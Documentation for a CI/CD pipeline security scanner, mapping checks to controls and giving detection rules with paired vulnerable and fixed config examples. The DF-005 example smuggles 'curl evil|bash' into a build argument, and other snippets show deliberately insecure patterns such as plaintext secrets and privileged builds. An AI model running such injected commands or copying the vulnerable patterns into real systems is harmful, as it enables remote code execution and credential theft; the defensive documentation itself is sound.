| [`GHA-061`](#detail-gha-061) | GitHub App token minted without a `permissions:` filter | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-062`](#detail-gha-062) | OIDC subject claim in sibling IaC grants overly broad scope | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`GHA-092`](#detail-gha-092) | PR head SHA captured then re-fetched (force-push race) | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`SCM-020`](#detail-scm-020) | Default workflow GITHUB_TOKEN has write permission | <span class="pg-sev pg-sev--high">HIGH</span> | [SCM](../providers/scm.md) |  |
| [`SCM-041`](#detail-scm-041) | Active ruleset doesn't gate on a deployment environment | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`TAINT-001`](#detail-taint-001) | Untrusted input flows across step boundaries via step outputs | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`TAINT-002`](#detail-taint-002) | Untrusted input flows across jobs via ``jobs.<id>.outputs:`` | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`TAINT-003`](#detail-taint-003) | Untrusted input forwarded into reusable workflow ``with:`` | <span class="pg-sev pg-sev--high">HIGH</span> | [GitHub Actions](../providers/github.md) |  |
| [`TAINT-004`](#detail-taint-004) | Untrusted input flows across jobs via dotenv artifact | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |
| [`TAINT-005`](#detail-taint-005) | Untrusted input flows across steps via ``buildkite-agent meta-data`` | <span class="pg-sev pg-sev--high">HIGH</span> | [Buildkite](../providers/buildkite.md) |  |
| [`TAINT-006`](#detail-taint-006) | Untrusted input flows across tasks via Tekton ``results`` | <span class="pg-sev pg-sev--high">HIGH</span> | [Tekton](../providers/tekton.md) |  |
| [`TAINT-007`](#detail-taint-007) | Untrusted input flows across templates via Argo ``outputs.parameters`` | <span class="pg-sev pg-sev--high">HIGH</span> | [Argo Workflows](../providers/argo.md) |  |
| [`TAINT-008`](#detail-taint-008) | Untrusted input flows via GitLab ``extends:`` template inheritance | <span class="pg-sev pg-sev--high">HIGH</span> | [GitLab CI](../providers/gitlab.md) |  |

### 1.5.3: Ensure scanners are in place to secure IaC instructions { #ctrl-1-5-3 }

**Evidenced by 25 checks** across 4 providers (CloudFormation, Dockerfile, Kubernetes, Terraform).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`CF-001`](#detail-cf-001) | Template declares AWS::IAM::AccessKey (long-lived credential) | <span class="pg-sev pg-sev--high">HIGH</span> | [CloudFormation](../providers/cloudformation.md) |  |
| [`CF-002`](#detail-cf-002) | Stateful data-store resource carries a plaintext secret | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [CloudFormation](../providers/cloudformation.md) |  |
| [`CF-003`](#detail-cf-003) | CodeBuild VPC config references a public subnet | <span class="pg-sev pg-sev--high">HIGH</span> | [CloudFormation](../providers/cloudformation.md) |  |
| [`DF-001`](#detail-df-001) | FROM image not pinned to sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-005`](#detail-df-005) | RUN uses shell-eval (eval / sh -c on a variable / backticks) | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-006`](#detail-df-006) | ENV or ARG carries a credential-shaped literal value | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-008`](#detail-df-008) | RUN invokes docker --privileged or escalates capabilities | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-019`](#detail-df-019) | COPY/ADD source path looks like a credential file | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-020`](#detail-df-020) | ARG declares a credential-named build argument | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`DF-021`](#detail-df-021) | RUN pip install bypasses TLS or uses an HTTP index | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-024`](#detail-df-024) | RUN npm/yarn/pnpm install runs lifecycle scripts | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-026`](#detail-df-026) | ENV disables Node.js TLS certificate verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-027`](#detail-df-027) | ENV disables Python HTTPS certificate verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-028`](#detail-df-028) | ENV disables Git TLS certificate verification | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`DF-029`](#detail-df-029) | ENV neuters Python requests CA bundle | <span class="pg-sev pg-sev--high">HIGH</span> | [Dockerfile](../providers/dockerfile.md) |  |
| [`K8S-001`](#detail-k8s-001) | Container image not pinned by sha256 digest | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-002`](#detail-k8s-002) | Pod hostNetwork: true | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-005`](#detail-k8s-005) | Container securityContext.privileged: true | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-013`](#detail-k8s-013) | Pod uses a hostPath volume | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) | <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> |
| [`K8S-017`](#detail-k8s-017) | Container env value carries a credential-shaped literal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-018`](#detail-k8s-018) | Secret stringData/data carries a credential-shaped literal | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`K8S-037`](#detail-k8s-037) | ConfigMap data carries a credential-shaped literal | <span class="pg-sev pg-sev--high">HIGH</span> | [Kubernetes](../providers/kubernetes.md) |  |
| [`TF-001`](#detail-tf-001) | Plan declares aws_iam_access_key (long-lived credential) | <span class="pg-sev pg-sev--high">HIGH</span> | [Terraform](../providers/terraform.md) |  |
| [`TF-002`](#detail-tf-002) | Stateful data-store resource carries a plaintext secret | <span class="pg-sev pg-sev--critical">CRITICAL</span> | [Terraform](../providers/terraform.md) |  |
| [`TF-003`](#detail-tf-003) | CodeBuild VPC config references a public subnet | <span class="pg-sev pg-sev--high">HIGH</span> | [Terraform](../providers/terraform.md) |  |

### 1.5.4: Ensure scanners are in place to identify and confirm presence of vulnerabilities { #ctrl-1-5-4 }

**Evidenced by 8 checks** across 3 providers (AWS, GitHub Actions, SCM).

| Check | Title | Severity | Provider | Fix |
|-------|-------|----------|----------|-----|
| [`ECR-001`](#detail-ecr-001) | Image scanning on push not enabled | <span class="pg-sev pg-sev--high">HIGH</span> | [AWS](../providers/aws.md) |  |
| [`ECR-007`](#detail-ecr-007) | Inspector v2 enhanced scanning disabled for ECR | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [AWS](../providers/aws.md) |  |
| [`GHA-020`](#detail-gha-020) | No vulnerability scanning step | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [GitHub Actions](../providers/github.md) |  |
| [`SCM-003`](#detail-scm-003) | GitHub default code scanning is not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-005`](#detail-scm-005) | Dependabot security updates are not enabled | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-045`](#detail-scm-045) | Default code scanning uses the limited query suite | <span class="pg-sev pg-sev--low">LOW</span> | [SCM](../providers/scm.md) |  |
| [`SCM-046`](#detail-scm-046) | Default code scanning is configured but paused | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |
| [`SCM-047`](#detail-scm-047) | Repo language excluded from default code-scanning coverage | <span class="pg-sev pg-sev--medium">MEDIUM</span> | [SCM](../providers/scm.md) |  |

## Check details

Every check that evidences this standard, rendered once with its detection mechanism, recommendation, and any known false-positive modes or real-world incident references. The per-control tables above link to the matching block here.

### `CF-001`: Template declares AWS::IAM::AccessKey (long-lived credential) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cf-001 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Fires on every ``AWS::IAM::AccessKey`` in the template. CloudFormation writes the resulting ``SecretAccessKey`` to stack outputs — the secret is now in every stack update log and every ``DescribeStacks`` response.

**Recommendation.** Replace static keys with role-based access: an ``AWS::IAM::Role`` plus an ``AWS::IAM::OIDCProvider`` for CI, or an IAM role for service-to-service auth. Static keys live forever in stack outputs and any tool that ever read them.

**Proof of exploit.**

```
# Vulnerable: every stack-create writes a fresh access key
# and stores the ``SecretAccessKey`` literal in the stack's
# Outputs. Any IAM principal that can call
# ``cloudformation:DescribeStacks`` on this stack reads the
# secret. The key never rotates and only goes away when the
# stack is torn down.
Resources:
  CiUser:
    Type: AWS::IAM::User
  CiAccessKey:
    Type: AWS::IAM::AccessKey
    Properties:
      UserName: !Ref CiUser
Outputs:
  AccessKeyId:
    Value: !Ref CiAccessKey
  SecretAccessKey:
    Value: !GetAtt CiAccessKey.SecretAccessKey

# Safe: declare an IAM role with a short-lived assume-role
# trust policy. For CI/CD, federate via GitHub OIDC
# (``token.actions.githubusercontent.com``) so tokens expire
# minutes after the workflow run. No long-lived secret ever
# exists, and the trust policy enforces ``sub`` / ``aud``
# claim equality on a single repo + ref.
Resources:
  CiRole:
    Type: AWS::IAM::Role
    Properties:
      AssumeRolePolicyDocument:
        Statement:
          - Effect: Allow
            Principal:
              Federated: arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com
            Action: sts:AssumeRoleWithWebIdentity
            Condition:
              StringEquals:
                token.actions.githubusercontent.com:sub:
                  repo:myorg/myrepo:ref:refs/heads/main
```

**Source:** [`CF-001`](../providers/cloudformation.md) in the [CloudFormation provider](../providers/cloudformation.md).

### `CF-002`: Stateful data-store resource carries a plaintext secret <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-cf-002 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code, [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Walks every string value of the stateful data-store resources (``AWS::RDS::DBInstance``, ``AWS::RDS::DBCluster``, ``AWS::Redshift::Cluster``, ``AWS::ElastiCache::ReplicationGroup``, ``AWS::DocDB::DBCluster``, ``AWS::Neptune::DBCluster``, ``AWS::OpenSearchService::Domain``, ``AWS::MemoryDB::Cluster``). Fires when a string leaf matches a credential shape OR when a secret-named attribute (``*Password``, ``*Token``, …) carries a non-placeholder literal.

**Recommendation.** Move the secret into Secrets Manager (or SSM Parameter Store SecureString) and reference it via ``'{{resolve:secretsmanager:…}}'`` at deploy time. Never literal-string a credential into a stateful resource — the value lives in the template, the stack history, and any drift detection report.

**Proof of exploit.**

```
# Vulnerable: a stateful resource carries a plaintext
# secret literal. The template is committed to git;
# CloudFormation stores the secret in stack drift / events
# / parameter overrides — visible to anyone with
# ``cloudformation:DescribeStack*``.
Resources:
  Db:
    Type: AWS::RDS::DBInstance
    Properties:
      DBInstanceClass: db.t3.medium
      Engine: postgres
      MasterUsername: appuser
      MasterUserPassword: hunter2-prod-master-pw

# Safe: reference a Secrets Manager dynamic reference.
# CloudFormation resolves the secret at stack-update
# time; the template carries only the ARN.
Resources:
  Db:
    Type: AWS::RDS::DBInstance
    Properties:
      DBInstanceClass: db.t3.medium
      Engine: postgres
      MasterUsername: appuser
      MasterUserPassword:
        '{{resolve:secretsmanager:prod/db/master:SecretString:password}}'
```

**Source:** [`CF-002`](../providers/cloudformation.md) in the [CloudFormation provider](../providers/cloudformation.md).

### `CF-003`: CodeBuild VPC config references a public subnet <span class="pg-sev pg-sev--high">HIGH</span> { #detail-cf-003 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** When ``AWS::CodeBuild::Project.Properties.VpcConfig.VpcId`` resolves to a concrete reference, walks every ``AWS::EC2::Subnet`` in the same VPC and fires if any has ``MapPublicIpOnLaunch: true``.

**Recommendation.** Place CodeBuild projects in private subnets (``MapPublicIpOnLaunch: false``) with egress routed through a NAT gateway or VPC interface endpoints. Public subnets put the build host on a public IP for the duration of the build.

**Proof of exploit.**

```
# Vulnerable: the CodeBuild project's VpcConfig points
# at a subnet whose ``MapPublicIpOnLaunch: true``. The
# build host gets a public IP for the duration of the
# build; outbound traffic doesn't go through NAT, and
# the host is reachable inbound (modulo SG rules).
Resources:
  Subnet:
    Type: AWS::EC2::Subnet
    Properties:
      CidrBlock: 10.0.1.0/24
      MapPublicIpOnLaunch: true
  Build:
    Type: AWS::CodeBuild::Project
    Properties:
      VpcConfig:
        VpcId: !Ref VPC
        Subnets: [!Ref Subnet]
        SecurityGroupIds: [!Ref BuildSG]

# Safe: route the project through a private subnet.
# Egress goes via a NAT gateway; no public IP on the
# build host.
Resources:
  PrivateSubnet:
    Type: AWS::EC2::Subnet
    Properties:
      CidrBlock: 10.0.10.0/24
      MapPublicIpOnLaunch: false
  Build:
    Type: AWS::CodeBuild::Project
    Properties:
      VpcConfig:
        VpcId: !Ref VPC
        Subnets: [!Ref PrivateSubnet]
        SecurityGroupIds: [!Ref BuildSG]
```

**Source:** [`CF-003`](../providers/cloudformation.md) in the [CloudFormation provider](../providers/cloudformation.md).

### `DF-001`: FROM image not pinned to sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-001 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Reuses ``_primitives/image_pinning.classify`` so the floating-tag semantics match GL-001 / JF-009 / ADO-009 / CC-003. ``PINNED_TAG`` (e.g. ``python:3.12.1-slim``) is treated as unpinned here too, only an explicit ``@sha256:`` survives, since the tag is mutable on the registry side.

**Recommendation.** Resolve every base image to its current digest (``docker buildx imagetools inspect <ref>`` prints it) and pin via ``FROM repo@sha256:<digest>``. Automate refreshes with Renovate or Dependabot. A floating tag (``:latest``, ``:3``, no tag) silently swaps the build base under every rebuild.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Seen in the wild.**

- Docker Hub typosquatting / namespace-takeover incidents (2017 onward): docker-library Sysdig and Aqua research documented thousands of malicious images uploaded under near-miss names (``alpine`` vs ``alphine``, etc.) and occasional namespace recoveries shipping crypto-miners downstream. Digest-pinned consumers are immune; tag-pinned consumers pull whatever sits under the name today.
- Codecov ``codecov/codecov-action`` tag-mutation incident (post-Codecov-Bash-uploader compromise): the upstream rotated the action's ``@v3`` tag during the fallout, and consumers pinning to the tag silently re-ran a different build than before. Digest pinning would have surfaced the change as a checksum mismatch instead of a silent swap.

**Proof of exploit.**

```
# Vulnerable: ``python:3.12-slim`` is a tag, and tags on
# Docker Hub are mutable. Python's publishers can (and do)
# repoint the same tag at a new image on every point
# release, and namespace takeovers / hijacked publisher
# accounts can silently swap a malicious image under the
# existing tag. The next rebuild picks up whatever's there
# now, with no signal to the consumer that the base
# changed.
FROM python:3.12-slim
COPY . /app
RUN pip install --require-hashes -r /app/requirements.txt
CMD ["python", "/app/main.py"]

# Safe: pin to the immutable sha256 digest. The leading
# comment documents which tag the digest corresponds to.
# Renovate / Dependabot's Docker ecosystem updaters resolve
# and bump these on a schedule so the pin doesn't drift
# behind security patches.
# python:3.12.1-slim (refreshed YYYY-MM-DD)
FROM python:3.12-slim@sha256:abc123...
COPY . /app
RUN pip install --require-hashes -r /app/requirements.txt
CMD ["python", "/app/main.py"]
```

**Source:** [`DF-001`](../providers/dockerfile.md#df-001) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-005`: RUN uses shell-eval (eval / sh -c on a variable / backticks) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-005 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Reuses ``_primitives/shell_eval.scan``, same primitive used by GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 / JF-030 so the safe / unsafe vocabulary matches across the tool.

**Recommendation.** Replace ``eval "$X"`` and ``sh -c "$X"`` with explicit argv invocations. If the build genuinely needs a templated command, render it through a sealed config file or use ``RUN --mount=type=secret`` with explicit input. ``$( … )`` / backticks should never wrap interpolated user-controlled vars inside a Dockerfile.

**Proof of exploit.**

```
# Vulnerable: ``eval`` on a build arg, or ``sh -c`` on an
# unquoted variable, gives the value full shell-grammar
# reach. A build arg passed via ``docker build --build-arg
# BUILD_CMD='echo hi;curl evil|bash'`` runs the curl in
# the build context.
FROM alpine@sha256:abc123...
ARG BUILD_CMD
RUN eval "$BUILD_CMD"

# Safe: replace dynamic shell evaluation with a script you
# own that validates the arg against an allow-list, or
# remove the indirection entirely (hard-code the build
# steps).
FROM alpine@sha256:abc123...
ARG TARGET=staging
RUN ./scripts/build-for-target.sh "$TARGET"
```

**Source:** [`DF-005`](../providers/dockerfile.md#df-005) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-006`: ENV or ARG carries a credential-shaped literal value <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-df-006 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code, [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Reuses ``_primitives/secret_shapes``, flags AKIA-prefixed AWS keys outright (the literal AWS access-key shape) and credential-named keys (``API_KEY``, ``DB_PASSWORD``, ``SECRET_TOKEN``) when the value is a non-empty literal.

**Recommendation.** Never hard-code credentials in a Dockerfile. ``ENV`` values are baked into the image layer history, even if the value is later overwritten, ``docker history --no-trunc`` reads the original. Use ``RUN --mount=type=secret`` for build-time secrets or runtime env injection (``docker run -e SECRET=…``) for runtime ones. Rotate any secret already exposed.

**Proof of exploit.**

```
# Vulnerable: ``API_KEY=sk_live_...`` lands in the image's
# layer history. ``docker history --no-trunc <image>`` (any
# user who can pull the image) prints the literal value
# even when a later layer overwrites or unsets it. Public
# images on Docker Hub are pulled and inspected en masse by
# secret scanners; private images leak the same way to
# anyone who exfils the registry credentials.
FROM node:20-alpine@sha256:abc123...
ENV API_KEY=sk_live_abc123def456ghi789
COPY . /app
RUN cd /app && npm ci

# Safe: keep the secret out of the image entirely. Use
# BuildKit's ``--mount=type=secret`` for build-time access
# (the secret never lands in any layer), and runtime
# injection (``docker run -e API_KEY=$VAULT_API_KEY``) for
# the running container. The Dockerfile only references
# the secret by mount path or env-var name.
# syntax=docker/dockerfile:1.7
FROM node:20-alpine@sha256:abc123...
COPY . /app
RUN --mount=type=secret,id=api_key \
    cd /app && API_KEY=$(cat /run/secrets/api_key) npm ci
```

**Source:** [`DF-006`](../providers/dockerfile.md#df-006) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-008`: RUN invokes docker --privileged or escalates capabilities <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-008 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Mirrors GHA-017 / GL-017 / BB-013 / ADO-017 / CC-017 / JF-017 (``docker run --privileged`` in CI scripts) but at Dockerfile build time. The risk is subtler: a privileged RUN step doesn't directly elevate the resulting image, but it gives the build host's docker daemon a chance to escape, and any tampered base image can exploit the elevated build.

**Recommendation.** A Dockerfile build step almost never legitimately needs ``--privileged`` or ``--cap-add SYS_ADMIN`` / ``ALL``. If the build genuinely requires elevated capabilities (e.g. compiling a kernel module), do it in a sealed builder image and ``COPY`` the artifact out, don't carry the privileged execution into the runtime image.

**Proof of exploit.**

```
# Vulnerable: ``RUN docker run --privileged`` (or
# ``--cap-add=SYS_ADMIN``) during image build requires
# privileged-mode on the BuildKit daemon AND grants the
# nested container full kernel access. A compromise of
# the inner build step escapes to the BuildKit host.
FROM ubuntu@sha256:abc123...
RUN docker run --privileged \
      -v /var/run/docker.sock:/var/run/docker.sock \
      myorg/inner-builder:latest ./inner-build.sh

# Safe: don't nest privileged docker invocations inside
# RUN. Use a multi-stage build instead — each stage is
# its own root filesystem; no host-kernel access required.
FROM myorg/inner-builder@sha256:abc123... AS builder
RUN ./inner-build.sh
FROM ubuntu@sha256:abc123...
COPY --from=builder /out/ /app/
```

**Source:** [`DF-008`](../providers/dockerfile.md#df-008) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-019`: COPY/ADD source path looks like a credential file <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-019 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code, [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Fires on any ``COPY`` or ``ADD`` whose source basename is a well-known credential filename (``id_rsa``, ``.npmrc``, ``.netrc``, ``.env``, ``terraform.tfvars``, …) or whose path tail matches a canonical credential location (``.aws/credentials``, ``.docker/config.json``, ``.kube/config``). Files with private-key extensions (``.pem``, ``.key``, ``.p12``, ``.pfx``, ``.jks``) are also flagged. Globs are not expanded, the rule reads the literal source token.

**Recommendation.** Don't ``COPY`` credential files into an image. Anything baked into a layer is recoverable by anyone who can pull the image, even if a later step deletes the file. For build-time secrets (npm tokens, registry credentials, SSH deploy keys), use ``RUN --mount=type=secret,id=<name>`` so the value lives only for the duration of the step. For runtime secrets, mount them from the orchestrator (Kubernetes Secret, ECS task role, Vault sidecar) instead.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Empty placeholder files (``.env`` shipped as a template, ``config.json`` carrying only public flags). Suppress with a brief ``.pipelinecheckignore`` rationale and prefer an explicit non-secret name (``.env.example``).

**Proof of exploit.**

```
# Vulnerable: ``COPY .npmrc`` (or ``.aws/credentials`` /
# ``.kube/config`` / ``.netrc``) bakes the host's local
# credential file into the image. Anyone who pulls the
# image extracts the credential via
# ``docker save | tar xf -``; the secret rides the image
# everywhere it's distributed.
FROM node@sha256:abc123...
WORKDIR /app
COPY . .
COPY .npmrc /root/.npmrc    # carries auth token into layer
RUN npm ci && npm run build

# Safe: use BuildKit's ``--mount=type=secret`` so the
# credential file is mounted only for the RUN that needs
# it. The secret never lands in any layer; ``docker save``
# returns an image with no trace.
# syntax=docker/dockerfile:1.7
FROM node@sha256:abc123...
WORKDIR /app
COPY . .
RUN --mount=type=secret,id=npmrc,target=/root/.npmrc \
    npm ci && npm run build
```

**Source:** [`DF-019`](../providers/dockerfile.md#df-019) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-020`: ARG declares a credential-named build argument <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-020 }

**Evidences:** [`1.5.1`](#ctrl-1-5-1) Ensure scanners are in place to identify and prevent sensitive data in code, [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Complements DF-006 (which flags an ENV/ARG with a literal credential-shaped value). This rule fires on the *name* alone, ``ARG NPM_TOKEN``, ``ARG GITHUB_PAT``, ``ARG DB_PASSWORD``, even when no default is set, because BuildKit records the resolved value in the image's history the moment ``--build-arg`` supplies one. Names are matched via the same ``_primitives/secret_shapes`` regex used by the other secret-name rules.

**Recommendation.** Don't pass secrets through ``ARG``. Build arguments are recorded in ``docker history`` whether the value comes from a default or from ``--build-arg`` at build time, so a credential-named ARG leaks the secret to anyone who can pull the image. Use ``RUN --mount=type=secret,id=<name>`` and feed the value with BuildKit's ``--secret`` flag, the secret never lands in a layer or in the build history.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- An ``ARG`` whose name matches the regex but is a non-secret config knob (a counter-example like ``ARG TOKEN_LIMIT``). Rare; rename or suppress the finding with a brief rationale.

**Proof of exploit.**

```
# Vulnerable: ``ARG NPM_TOKEN`` declares a build argument
# whose name signals it carries a credential. Build args
# are visible in ``docker history``, so the value (passed
# via ``--build-arg NPM_TOKEN=...``) lands in image
# metadata and leaks the same way as a literal ENV.
FROM node@sha256:abc123...
ARG NPM_TOKEN
RUN npm config set //registry.npmjs.org/:_authToken "$NPM_TOKEN" \
    && npm ci

# Safe: use BuildKit secret mounts. The token is read
# from a file at RUN time only; nothing about the token
# (not even its existence as a build arg) lands in
# ``docker history``.
# syntax=docker/dockerfile:1.7
FROM node@sha256:abc123...
RUN --mount=type=secret,id=npm_token \
    NPM_TOKEN=$(cat /run/secrets/npm_token) && \
    npm config set //registry.npmjs.org/:_authToken "$NPM_TOKEN" && \
    npm ci && \
    npm config delete //registry.npmjs.org/:_authToken
```

**Source:** [`DF-020`](../providers/dockerfile.md#df-020) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-021`: RUN pip install bypasses TLS or uses an HTTP index <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-021 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Three shapes are detected: ``pip install --trusted-host <host>``, ``pip install -i http://...`` (or ``--index-url http://...``), and ``pip install --extra-index-url http://...``. All three tell pip to accept whatever the upstream returns without certificate verification. The result is a build-time supply-chain MITM surface: anyone able to inject responses on the network path between the build host and the index can ship arbitrary wheels into the image. Complements the generic TLS-bypass primitive (which catches ``pip config set global.trusted-host``) by covering the per-invocation flag form most teams actually reach for.

**Recommendation.** Drop ``--trusted-host`` and switch any ``-i`` / ``--index-url`` / ``--extra-index-url`` to ``https://``. If the internal index has a self-signed certificate, install the CA into the image's truststore (``ca-certificates`` + ``update-ca-certificates``) instead of telling pip to skip verification. ``--trusted-host`` whitelists the host across the entire pip invocation, so a single ``RUN`` line ends up fetching every dependency over an unverified connection.

**Known false positives.**

- An internal index served over plain HTTP on a private network (no internet path) is the typical justification for the flag. Fix the index (terminate TLS at a reverse proxy, or install the internal CA into the image) rather than leaving the bypass in the Dockerfile.

**Proof of exploit.**

```
# Vulnerable: pip resolves and downloads packages over
# plaintext HTTP, so any network attacker between the
# build and the registry can substitute a wheel. The
# ``--trusted-host`` flag silences pip's hash
# verification for the named host too.
FROM python@sha256:abc123...
RUN pip install \
      --index-url http://internal-pypi.example.com/simple \
      --trusted-host internal-pypi.example.com \
      -r requirements.txt

# Safe: HTTPS with the index's certificate validated.
# Internal CA installed into the image's trust store;
# ``--require-hashes`` enforces hash pinning.
FROM python@sha256:abc123...
COPY ci/internal-ca.crt /usr/local/share/ca-certificates/
RUN update-ca-certificates && \
    pip install \
      --index-url https://internal-pypi.example.com/simple \
      --require-hashes -r requirements.txt
```

**Source:** [`DF-021`](../providers/dockerfile.md#df-021) in the [Dockerfile provider](../providers/dockerfile.md).

### `DF-024`: RUN npm/yarn/pnpm install runs lifecycle scripts <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-024 }

**Evidences:** [`1.5.3`](#ctrl-1-5-3) Ensure scanners are in place to secure IaC instructions.

**How this is detected.** Fires on ``npm install`` / ``npm ci`` / ``npm i`` (non-global), ``pnpm install`` / ``pnpm i``, and ``yarn install`` / bare ``yarn`` in a ``RUN`` body when ``--ignore-scripts`` is absent from the same line. Detection short-circuits when the same Dockerfile sets ``ENV NPM_CONFIG_IGNORE_SCRIPTS=true`` (``npm``), ``ENV YARN_ENABLE_SCRIPTS=false`` (yarn berry), or ``ENV CI=true`` is paired with an ``.npmrc`` configured to disable scripts (the env-level kill-switch is detected; the rule trusts ``.npmrc`` only when it's also written by the Dockerfile via ``echo ignore-scripts=true >> .npmrc``). Complements DF-022 (``npm ci`` vs ``npm install``), which guards lockfile integrity; DF-024 guards lifecycle-script execution. A pinned lockfile does not help when the pinned version is the malicious one, only ``--ignore-scripts`` does.

